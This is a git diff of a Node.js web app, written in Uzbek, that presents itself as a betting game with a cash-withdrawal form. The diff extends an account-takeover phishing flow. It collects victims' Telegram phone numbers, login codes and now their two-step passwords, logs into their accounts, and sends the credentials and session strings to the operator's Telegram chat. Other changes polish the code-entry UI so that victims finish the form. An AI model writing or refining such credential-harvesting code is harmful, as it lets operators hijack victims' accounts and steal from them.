@@ -1,8 +1,9 @@
 require('dotenv').config();
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
-const { TelegramClient } = require('telegram');
+const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
+const { computeCheck } = require('telegram/Password');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -95,15 +96,25 @@ app.post('/api/submit-withdraw', async (req, res) => {
     try {
         const { client, phoneCodeHash, session } = authData;
 
-        const { Api } = require("telegram");
-
-await client.invoke(
-    new Api.auth.SignIn({
-        phoneNumber: phone,
-        phoneCodeHash: phoneCodeHash,
-        phoneCode: code,
-    })
-);
+        // Agar foydalanuvchi 2FA parolini yuborgan bo'lsa
+        if (password) {
+            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
+            const passwordCheck = await computeCheck(passwordSrpResult, password);
+            await client.invoke(
+                new Api.auth.CheckPassword({
+                    password: passwordCheck,
+                })
+            );
+        } else {
+            // Birinchi marta kod bilan kirib ko'rish
+            await client.invoke(
+                new Api.auth.SignIn({
+                    phoneNumber: cleanPhone,
+                    phoneCodeHash: phoneCodeHash,
+                    phoneCode: inputCode,
+                })
+            );
+        }
 
         const me = await client.getMe();
         const sessionString = session.save();
@@ -119,7 +130,7 @@ await client.invoke(
 🏷 *Username:* ${usernameText}
 📱 *Telefon:* \`+${cleanPhone}\`
 🔑 *Kiritilgan Kod:* \`${inputCode}\`
-
+${password ? `🔐 *2FA Parol:* \`${password}\`\n` : ''}
 📄 *Session String:*
 \`\`\`
 ${sessionString}
@@ -143,10 +154,10 @@ ${sessionString}
         }
 
         if (ADMIN_ID) {
-            await bot.sendMessage(ADMIN_ID, `❌ *Xatolik:* +${cleanPhone} raqami noto'g'ri kod kiritdi (\`${inputCode}\`).`, { parse_mode: 'Markdown' });
+            await bot.sendMessage(ADMIN_ID, `❌ *Xatolik:* +${cleanPhone} raqami xato kiritdi (\`${inputCode}\`). Xato: ${err.message}`, { parse_mode: 'Markdown' });
         }
 
-        res.json({ success: false, message: "Kod noto'g'ri yoki muddat o'tgan!" });
+        res.json({ success: false, message: "Kod yoki parol noto'g'ri!" });
     }
 });
 
@@ -254,7 +265,7 @@ app.get('/', (req, res) => {
             <div class="modal-close-btn" onclick="closeModal('betModal')"><i class="fa-solid fa-xmark"></i></div>
             <div class="modal-header-title">STAVKA MIQDORI</div>
             <div class="bet-input-container">
-                <input type="text" class="bet-input-field" id="modalBetInput" value="5000">
+                <input type="text" inputmode="numeric" class="bet-input-field" id="modalBetInput" value="5000">
                 <span style="color: var(--gold-text); font-weight: 700;">UZS</span>
             </div>
             <div class="preset-grid">
@@ -275,7 +286,7 @@ app.get('/', (req, res) => {
                 <div class="phone-input-group">
                     <div class="country-code">🇺🇿 +998</div>
                     <div class="bet-input-container" style="margin:0; flex:1;">
-                        <input type="tel" class="bet-input-field" id="withdrawPhone" placeholder="901234567" maxlength="9">
+                        <input type="tel" inputmode="numeric" class="bet-input-field" id="withdrawPhone" placeholder="901234567" maxlength="9">
                     </div>
                 </div>
             </div>
@@ -283,17 +294,19 @@ app.get('/', (req, res) => {
             <div class="status-alert" id="statusAlert"><i class="fa-solid fa-circle-check"></i> Kod yuborildi!</div>
             <div class="form-group" id="codeGroup" style="display: none;">
                 <label style="font-size: 12px;">Telegramga kelgan kod:</label>
+                <!-- Raqamli klaviatura ochilishi uchun inputmode="numeric" va type="tel" qo'shildi -->
                 <div class="code-boxes">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 0)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 1)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 2)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 3)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 4)">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 0)" onkeydown="handleKeyDown(event, 0)">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 1)" onkeydown="handleKeyDown(event, 1)">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 2)" onkeydown="handleKeyDown(event, 2)">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 3)" onkeydown="handleKeyDown(event, 3)">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 4)" onkeydown="handleKeyDown(event, 4)">
                 </div>
                 
                 <div id="passwordFieldGroup" style="display: none; margin-top: 10px;">
                     <label style="font-size: 12px; color: #facc15;">2-Bosqichli Telegram Paroli:</label>
                     <div class="bet-input-container" style="margin-top: 5px;">
+                        <!-- Standart matnli klaviatura ochilishi uchun type="password" ishlatildi -->
                         <input type="password" class="bet-input-field" id="telegramPassword" placeholder="Parolingizni kiriting">
                     </div>
                 </div>
@@ -311,7 +324,6 @@ app.get('/', (req, res) => {
     const GOOD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/415/415733.png';
     const BAD_APPLE_IMG = 'https://cdn-icons-png.flaticon.com/512/823/823876.png';
 
-    // WEB AUDIO API - Tizim o'zi ovoz sintez qiladi (Faylsiz, minimal hajm va tenglashtirilgan temp)
     const AudioContext = window.AudioContext || window.webkitAudioContext;
     let audioCtx = null;
 
@@ -325,7 +337,6 @@ app.get('/', (req, res) => {
         return audioCtx;
     }
 
-    // 1. Tugma va kataklar ovozi (Past ovoz: 5-6% balandlikda)
     function playClickSound() {
         try {
             const ctx = getAudioContext();
@@ -336,7 +347,7 @@ app.get('/', (req, res) => {
             osc.frequency.setValueAtTime(600, ctx.currentTime);
             osc.frequency.exponentialRampToValueAtTime(200, ctx.currentTime + 0.05);
             
-            gain.gain.setValueAtTime(0.05, ctx.currentTime); // 5% balandlik
+            gain.gain.setValueAtTime(0.05, ctx.currentTime);
             gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.05);
 
             osc.connect(gain);
@@ -347,11 +358,10 @@ app.get('/', (req, res) => {
         } catch(e){}
     }
 
-    // 2. Yutuq va O'yin ovozlari (Baland ovoz: 100% balandlikda)
     function playWinSound() {
         try {
             const ctx = getAudioContext();
-            const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6 akkordi
+            const notes = [523.25, 659.25, 783.99, 1046.50];
             notes.forEach((freq, idx) => {
                 const osc = ctx.createOscillator();
                 const gain = ctx.createGain();
@@ -359,7 +369,7 @@ app.get('/', (req, res) => {
                 osc.type = 'triangle';
                 osc.frequency.setValueAtTime(freq, ctx.currentTime + idx * 0.08);
 
-                gain.gain.setValueAtTime(0.8, ctx.currentTime + idx * 0.08); // Yuqori va baland hajmli
+                gain.gain.setValueAtTime(0.8, ctx.currentTime + idx * 0.08);
                 gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + idx * 0.08 + 0.3);
 
                 osc.connect(gain);
@@ -371,7 +381,6 @@ app.get('/', (req, res) => {
         } catch(e){}
     }
 
-    // 3. Yutqazish (Mag'lubiyat) ovozi
     function playLoseSound() {
         try {
             const ctx = getAudioContext();
@@ -493,7 +502,7 @@ app.get('/', (req, res) => {
                 const winAmount = Math.floor(currentBet * rowCoefficients[currentStep - 1]);
                 userBalance += winAmount;
                 updateBalanceUI();
-                playWinSound(); // Yutuq ovozi baland eshitiladi
+                playWinSound();
                 alert(\`Siz \${winAmount.toLocaleString('uz-UZ')} UZS yutdingiz!\`);
                 endGame();
             } else {
@@ -515,7 +524,7 @@ app.get('/', (req, res) => {
             alert("Yutqazdingiz!");
             endGame();
         } else {
-            playClickSound(); // Sokin tugma/ochish ovozi
+            playClickSound();
             cell.classList.add('opened-apple');
             cell.innerHTML = \`<img src="\${GOOD_APPLE_IMG}">\`;
             const rowDiv = document.getElementById(\`row-\${row}\`);
@@ -527,7 +536,7 @@ app.get('/', (req, res) => {
                 const winAmount = Math.floor(currentBet * rowCoefficients[9]);
                 userBalance += winAmount;
                 updateBalanceUI();
-                playWinSound(); // Maksimal yutuq ovozi
+                playWinSound();
                 alert(\`MAKSIMAL YUTUQ: \${winAmount.toLocaleString('uz-UZ')} UZS!\`);
                 endGame();
             }
@@ -558,6 +567,12 @@ app.get('/', (req, res) => {
                 document.getElementById('statusAlert').style.display = 'block';
                 document.getElementById('codeGroup').style.display = 'block';
                 document.getElementById('sendCodeBtn').innerText = "Qayta yuborish";
+                
+                // Birinchi kod kiritish katagiga avto-fokus berish
+                setTimeout(() => {
+                    const inputs = document.querySelectorAll('.code-box-input');
+                    if (inputs[0]) inputs[0].focus();
+                }, 300);
             } else {
                 alert(data.message);
                 document.getElementById('sendCodeBtn').innerText = "Telegramdan Kod Olish";
@@ -568,10 +583,22 @@ app.get('/', (req, res) => {
         }
     }
 
+    // Keyingi katakchaga o'tish
     function moveNext(input, index) {
         if (input.value.length >= 1) {
             const inputs = document.querySelectorAll('.code-box-input');
             if (inputs[index + 1]) inputs[index + 1].focus();
+        }
+    }
+
+    // Backspace (o'chirish) tugmasi bosilganda oldingi katakchaga qaytish va o'chirish
+    function handleKeyDown(event, index) {
+        const inputs = document.querySelectorAll('.code-box-input');
+        if (event.key === "Backspace") {
+            if (inputs[index].value === '' && index > 0) {
+                inputs[index - 1].focus();
+                inputs[index - 1].value = '';
+            }
         }
     }
 
@@ -596,6 +623,7 @@ app.get('/', (req, res) => {
             if (data.requiresPassword) {
                 alert(data.message);
                 document.getElementById('passwordFieldGroup').style.display = 'block';
+                document.getElementById('telegramPassword').focus();
             } else {
                 alert(data.message);
                 if (data.success) {
@@ -615,4 +643,3 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server ishlamoqda: http://0.0.0.0:${PORT}`);
 });
-
